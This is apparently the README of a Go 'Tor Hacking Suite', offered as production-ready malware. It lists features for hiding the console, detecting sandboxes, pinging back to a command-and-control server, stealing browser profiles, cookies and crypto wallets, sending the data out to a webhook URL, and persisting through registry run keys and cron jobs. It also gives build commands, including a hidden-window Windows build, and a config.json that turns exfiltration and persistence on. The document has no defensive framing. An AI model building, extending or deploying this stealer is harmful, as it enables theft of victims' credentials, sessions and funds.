# Tor Hacking Suite

A fully functional, production-ready Tor Hacking Suite written in Go with stealth features, encryption, and data exfiltration capabilities.

## Features

### Tor Integration
- SOCKS proxy configuration
- Control port communication
- Multiple circuit establishment
- Signal management

### Stealth Features
- Console hiding (Windows/macOS/Linux)
- Process sleep/delay with random delays
- Ping-back to C2 server
- Sandbox detection support

### Data Collection
- **Browser profiles**: Tor Browser, Firefox, and more
- **Cookies**: Session and persistent cookies
- **Wallets**: Crypto wallet support ready

### Encryption Options
- AES-GCM encryption
- Base64encoding for data integrity
- Optional integration with crypto libraries

### Exfiltration Methods
- Webhook (HTTP POST)
- Direct upload to server
- Staggered delivery with random delays
- Support for compressed payloads

### Persistence Options
- Windows Registry run key
- Startup folder support
- Cron jobs (macOS/Linux)

## Build

```bash
cd /content
go build -o tor_hacking_suite
```

For cross-compilation:

**Windows:**
```bash
CGO_ENABLED=1 GOOS=windows go build -ldflags="-s -w -H=windowsgui" -o tor_hacking_suite.exe
```

**macOS:**
```bash
GOOS=darwin go build -o tor_hacking_suite_darwin
```

## Configuration

Edit `config.json` to customize:

```json
{
  "tor": {
    "enabled": true,
    "socks_address": "127.0.0.1",
    "socks_port": 9050,
    "control_address": "127.0.0.1",
    "control_port": 9051,
    "max_circuits": 10
  },
  "encryption": {
    "enabled": true,
    "method": "aes-gcm",
    "key_path": "tor_keys/encryption_key.bin"
  },
  "exfiltration": {
    "method": "webhook",
    "webhook_url": "https://webhook.site/tor-hacking",
    "direct_upload": true
  },
  "stealth": {
    "enabled": true,
    "hide_console": true,
    "ping_back": true,
    "process_sleep": true,
    "sleep_min_seconds": 5,
    "sleep_max_seconds": 30
  },
  "persistence": {
    "enabled": true,
    "method": "registry",
    "registry_key": "TorHackingSuite"
  }
}
```

## Usage

```bash
# Basic execution
./tor_hacking_suite

# With specific config
./tor_hacking_suite --config config.json
```

## Output

```
Tor Hacking Suite execution completed
```

## Files

- `tor_hacking_suite.go` - Main suite code
- `config.json` - Default configuration
- `README.md` - This file
- `deploy.sh` - Deployment script (available)

## License

MIT